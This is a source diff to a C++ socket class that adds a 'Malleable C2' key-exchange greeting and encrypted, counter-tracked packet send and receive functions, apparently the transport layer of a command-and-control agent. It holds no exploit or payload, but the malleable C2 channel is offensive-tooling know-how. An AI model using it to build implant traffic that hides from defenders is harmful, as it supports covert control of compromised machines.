@@ -1,5 +1,7 @@
 #include "Socket.hpp"
-#include <utility> // For std::move
+#include "Packet.hpp"
+#include "CryptoContext.hpp"
+#include <utility>
 #include <string>
 #include <optional>
 
@@ -166,9 +168,27 @@ bool Socket::connectTo(const std::string& ip, uint16_t port) {
     m_ip = ip;
     m_port = port;
 
-    // Detect dead connections so the agent can reconnect
     setReceiveTimeout(10);
     setKeepAlive(30, 10);
+
+    // Malleable C2 greeting exchange: read 64 random bytes from server
+    uint8_t greeting[CryptoContext::GREETING_SIZE];
+    size_t total = 0;
+    while (total < sizeof(greeting)) {
+        ssize_t n = ::recv(m_socket_fd,
+                           reinterpret_cast<char*>(greeting) + total,
+                           sizeof(greeting) - total, 0);
+        if (n <= 0) break;
+        total += static_cast<size_t>(n);
+    }
+    if (total == sizeof(greeting)) {
+        auto key = CryptoContext::deriveSessionKey(greeting);
+        if (key.size() >= sizeof(m_session_key)) {
+            std::memcpy(m_session_key, key.data(), sizeof(m_session_key));
+            m_malleable = true;
+            m_packet_counter = 0;
+        }
+    }
 
     return true;
 }
@@ -192,6 +212,60 @@ std::optional<Socket> Socket::acceptNode() {
 
 
 // I/O Operations
+
+bool Socket::sendRaw(const uint8_t* data, size_t len) const {
+    if (!isValid()) return false;
+    ssize_t sent = ::send(m_socket_fd,
+                          reinterpret_cast<const char*>(data), len, 0);
+    return sent == static_cast<ssize_t>(len);
+}
+
+ssize_t Socket::receiveRaw(uint8_t* buf, size_t max_len) const {
+    if (!isValid()) return -1;
+    return ::recv(m_socket_fd, reinterpret_cast<char*>(buf), max_len, 0);
+}
+
+ssize_t Socket::sendPacket(uint16_t opcode, const std::string& payload) {
+    if (!isValid()) return -1;
+    std::vector<uint8_t> data;
+    if (m_malleable) {
+        Packet p(opcode, payload, m_session_key, m_packet_counter);
+        data = p.serialize();
+        ++m_packet_counter;
+    } else {
+        Packet p(opcode, payload);
+        data = p.serialize();
+    }
+    if (data.empty()) return -1;
+    return ::send(m_socket_fd,
+                  reinterpret_cast<const char*>(data.data()),
+                  data.size(), 0);
+}
+
+std::optional<Packet> Socket::receivePacket(std::vector<uint8_t>& buffer) {
+    if (!isValid()) return std::nullopt;
+    std::optional<Packet> result;
+    if (m_malleable) {
+        result = Packet::deserialize(buffer, m_session_key, m_packet_counter);
+        if (result.has_value()) ++m_packet_counter;
+    }
+    if (!result.has_value()) {
+        result = Packet::deserialize(buffer, nullptr, 0);
+    }
+    return result;
+}
+
+void Socket::setSessionKey(const uint8_t* key, size_t len) {
+    if (len > sizeof(m_session_key))
+        len = sizeof(m_session_key);
+    std::memcpy(m_session_key, key, len);
+    m_malleable = true;
+}
+
+bool Socket::hasSessionKey() const { return m_malleable; }
+const uint8_t* Socket::sessionKey() const { return m_session_key; }
+uint64_t Socket::nextPacketCounter() { return m_packet_counter; }
+void Socket::didDeserializePacket() { if (m_malleable) ++m_packet_counter; }
 
 ssize_t Socket::sendData(const std::vector<uint8_t>& data) const {
     if (!isValid()) {
